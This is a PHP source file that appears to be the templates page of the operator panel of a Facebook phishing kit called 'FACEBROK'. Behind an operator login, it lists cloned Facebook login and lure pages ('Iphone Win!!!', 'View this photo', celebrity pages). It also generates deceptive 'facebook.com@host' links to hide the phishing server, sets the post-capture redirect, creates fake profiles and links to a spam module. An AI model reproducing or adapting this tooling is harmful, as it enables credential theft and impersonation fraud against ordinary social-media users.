<?php

	include 'core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	if(!$facebrok->check_session()){
		if($_GET['action']=="login"){
			$facebrok->checkuser($_POST['userp'],$_POST['passp']);
		}
		?>
		<style type="text/css"> @import url(https://fonts.googleapis.com/css?family=Roboto:400,300,600,400italic); * {margin: 0; padding: 0; box-sizing: border-box; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -webkit-font-smoothing: antialiased; -moz-font-smoothing: antialiased; -o-font-smoothing: antialiased; font-smoothing: antialiased; text-rendering: optimizeLegibility; } body {font-family: "Roboto", Helvetica, Arial, sans-serif; font-weight: 100; font-size: 12px; line-height: 30px; color: #777; background: #196386; } .container {max-width: 400px; width: 100%; margin: 0 auto; position: relative; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea, #contact button[type="submit"] {font: 400 12px/16px "Roboto", Helvetica, Arial, sans-serif; } #contact {background: #F9F9F9; padding: 25px; margin: 150px 0; box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24); } #contact h3 {display: block; font-size: 30px; font-weight: 300; margin-bottom: 10px; } #contact h4 {margin: 5px 0 15px; display: block; font-size: 13px; font-weight: 400; } fieldset {border: medium none !important; margin: 0 0 10px; min-width: 100%; padding: 0; width: 100%; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea {width: 100%; border: 1px solid #ccc; background: #FFF; margin: 0 0 5px; padding: 10px; } #contact input[type="text"]:hover, #contact input[type="email"]:hover, #contact input[type="tel"]:hover, #contact input[type="url"]:hover, #contact textarea:hover {-webkit-transition: border-color 0.3s ease-in-out; -moz-transition: border-color 0.3s ease-in-out; transition: border-color 0.3s ease-in-out; border: 1px solid #aaa; } #contact textarea {height: 100px; max-width: 100%; resize: none; } #contact button[type="submit"] {cursor: pointer; width: 100%; border: none; background: #4CAF50; color: #FFF; margin: 0 0 5px; padding: 10px; font-size: 15px; } #contact button[type="submit"]:hover {background: #43A047; -webkit-transition: background 0.3s ease-in-out; -moz-transition: background 0.3s ease-in-out; transition: background-color 0.3s ease-in-out; } #contact button[type="submit"]:active {box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5); } .copyright {text-align: center; } #contact input:focus, #contact textarea:focus {outline: 0; border: 1px solid #aaa; } ::-webkit-input-placeholder {color: #888; } :-moz-placeholder {color: #888; } ::-moz-placeholder {color: #888; } :-ms-input-placeholder {color: #888; } </style> <div class="container">
		<link rel="shortcut icon" href="../asses/facebook.ico" />
		<title>FACEBROK Log in</title> 
		  <form id="contact" action="index.php?action=login" method="post">
		    <h3>FACEBROK</h3>
		    <h4>Log in</h4>
		    <fieldset>
		      <input placeholder="username facebrok" type="text" name="userp" tabindex="5" required>
		    </fieldset>
		    <fieldset>
		      <input placeholder="password facebrok" type="text" name="passp" tabindex="6" required></textarea>
		    </fieldset>
		    <fieldset>
		      <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">Login</button>
		    </fieldset>
		  </form>
		</div>
		<?php
	}else{

		$MSG="";
		if($_GET['action']=="logout"){$facebrok->logout();}
		if($_GET['action']=="change_url"){$MSG=$facebrok->change_url($_POST['url']);}
		if($_GET['action']=="create_profile"){$MSG=$facebrok->create_profile($_POST['name'],$_POST['url_photo_perfil'],$_POST['url_cover_perfil']);}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><link rel="shortcut icon" href="asses/facebook.ico" />
<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
	<title>FACEBROK Panel - templates</title>
	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
</head>
<body>
<!-- Header -->
<div id="header">
	<div class="shell">
		<!-- Logo + Top Nav -->
		<div id="top">
			<h1><img src="asses/facebrok_icon.png"></h1>

		</div>
		<!-- End Logo + Top Nav -->
		<!-- Main Nav -->
		<div id="navigation">
			<ul>
			    <li><a href="index.php" class="active"><span>Dashboard</span></a></li>
			    <li><a href="templates.php"><span>Templates</span></a></li>
			    <li><a href="spammer.php"><span>Spam</span></a></li>
			    <li><a href="config.php"><span>Config</span></a></li>
			    <li><a href="about.php"><span>About</span></a></li>
			    <li><a href="index.php?action=logout"><span>Log out</span></a></li>
			</ul>
		</div>
		<!-- End Main Nav -->
	</div>
</div>
<!-- End Header -->

<!-- Container -->
<div id="container">
	<div class="shell">
		
		<!-- Small Nav -->
		<div class="small-nav">
			<a href="#">templates</a>
			<span>&gt;</span>
			TEMPLATES
		</div>
		<!-- End Small Nav -->
		
		<?php echo $MSG;?>
		

		<br />
		<!-- Main -->
		<div id="main">
			<div class="cl">&nbsp;</div>
			
			<!-- Content -->
			<div id="content">
				
				<!-- Box -->
				<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2 class="left">TEMPLATES</h2>
						
					</div>
					<!-- End Box Head -->	

					
					<!-- Table -->
					<div class="table">
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
							<tr>
								<th>Name</th>
								<th>Mobil</th>
								<th>Link</th>
							</tr>
							<tr>
								<td>Main Page</td>
								<td>yes</td>
								<td><a href="../" target="_blank">[WEB]</a><a href="../m/" target="_blank">[MOBIL]</a></td>
							</tr>
							<tr>
								<td>Log in</td>
								<td>yes</td>
								<td><a href="../login.php?login_attempt=1&lwv=1" target="_blank">[WEB]</a><a href="../m/" target="_blank">[MOBIL]</a></td>
							</tr>							<tr>
								<td>Unavailable</td>
								<td>no</td>
								<td><a href="../unavailable.php" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>Mia Khalifa</td>
								<td>no</td>
								<td><a href="../miakhalifaofficialpage/" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>Nickimaj</td>
								<td>no</td>
								<td><a href="../nickimaj/" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>View this photo</td>
								<td>no</td>
								<td><a href="../photo.php?img=Aff1ZNxvi-c_R7dnFV8uTF-8IdqOuEJNhkDs5v-Ol2ts78068HlR2ntZOUWINYmzf3dLH3mrebMUEKK4t-ISzzwIvhWKQVfTMr6oIjCPkR8C0tw&smuh=23612&lh=Ac9bg3B2dhJ-i_D" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>Play this Game</td>
								<td>no</td>
								<td><a href="../game.php?news=Hfg_sd53" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>Rendering link</td>
								<td>yes</td>
								<td><a href="http://www.facebook.com@<?php echo $_SERVER["HTTP_HOST"].'/login.php?login_attempt=1&lwv=1';?>" target="_blank">[WEB]</a><a href="http://www.facebook.com@<?php echo $_SERVER["HTTP_HOST"].'/m/login.php?login_attempt=1&lwv=1';?>" target="_blank">[MOBIL]</a></td>
							</tr>
							<tr>
								<td>Buffer Overflow (WARNING)</td>
								<td>yes</td>
								<td><a href="../login.php?login_attempt=1&lwv=2" target="_blank">[WEB]</a></td>
							</tr>
								<tr>
								<td>Blocked Link</td>
								<td>no</td>
								<td><a href="../l.php?u=www.youtube.com/watch?view=2jma2o421" target="_blank">[WEB]</a></td>
							</tr>
							<tr>
								<td>Iphone Win!!!</td>
								<td>no</td>
								<td><a href="../promotion/?id=f1ZNxvi-c_R7dnFV8uTF-8IdqOuEJNhkDs5v-Ol2ts78068HlR2ntZOUWINYmzf3dLH3mrebMUEKK4t-ISzzwIvhWKQVfTMr6oIjCPkR8C0tw&smuh=23612&lh=Ac9bg3B2dhJ-i_Df1ZNxvi-c_R7dnFV8uTF-8IdqOuEJNhkDs5v-Ol2ts78068HlR2ntZOUWINYmzf3dLH3mrebMUEKK4t-ISzzwIvhWKQVfTMr6oIjCPkR8C0tw&smuh=23612&lh=Ac9bg3B2dhJ-i_D" target="_blank">[WEB]</a></td>
							</tr>
						</table>
					</div>

				</div>
			</div>
			<div class="cl">&nbsp;</div>			
		</div>
		<!-- Main -->
		<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2>REDIRECTING TO</h2>
					</div>
					<!-- End Box Head -->
					
					<form action="templates.php?action=change_url" method="post">
						
						<!-- Form -->
						<div class="form">
								<p>
									<span class="req">max 100 symbols</span>
									<label>URL <span>(Required Field)</span></label>
									<input class="field size1" name="url" value="<?php echo $facebrok->get_url_redirect();?>" type="text">
								</p>	
								
						<!-- Form Buttons -->
						<div class="buttons">
							<input class="button" value="submit" type="submit">
						</div>
						<!-- End Form Buttons -->
					</form>
				</div>
		<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2>CREATE A FAKE PERFIL</h2>
					</div>
					<!-- End Box Head -->
					
					<form action="templates.php?action=create_profile" method="post">
						
						<!-- Form -->
						<div class="form">
								<p>
									<span class="req">max 100 symbols</span>
									<label>Name <span>(Required Field)</span></label>
									<input class="field size1" name="name" value="Red Toor" type="text">
								</p><p>
									<span class="req">max 100 symbols</span>
									<label>Url Profile Photo <span>(Required Field)</span></label>
									<input class="field size1" name="url_photo_perfil" value="https://scontent.feoh1-1.fna.fbcdn.net/v/t1.0-9/12002997_891892920905682_8634560703585426469_n.jpg?oh=420b4eda4146d4a3572258504ea74750&oe=5862CE35" type="text">
								</p>	<p>
									<span class="req">max 100 symbols</span>
									<label>Url Cover Photo <span>(Required Field)</span></label>
									<input class="field size1" name="url_cover_perfil" value="https://scontent.feoh1-1.fna.fbcdn.net/v/t1.0-9/12801661_978186202276353_3335019923720375691_n.jpg?oh=ba749935c9e84b1b73a6fb035296b9b3&oe=587044D0" type="text">
								</p>	
								
						<!-- Form Buttons -->
						<div class="buttons">
							<input class="button" value="submit" type="submit">
						</div>
						<!-- End Form Buttons -->
					</form>
				</div>
	</div>
</div>
<!-- End Container -->



</body>
</html>
<?php } ?>